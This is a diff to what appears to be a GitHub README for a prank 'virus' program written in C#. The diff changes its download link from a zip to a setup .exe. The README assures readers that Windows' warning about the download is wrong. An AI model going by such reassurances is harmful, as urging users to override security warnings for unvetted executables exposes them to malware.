@@ -8,7 +8,7 @@
 ### It is made in c#.
 ### And when you install it, it is called ***GnomeVirus_lol***.
 
-[***Download: click here!***](https://github.com/SuperPieter/Furry-Virus/blob/master/Funny_Virus.zip?raw=true)
+[***Download: click here!***](https://github.com/SuperPieter/GnomePower/blob/master/Gnome_setup.exe?raw=true)
 
 
 ## If you download it, windows might say it's dangerous but that's **NOT**!
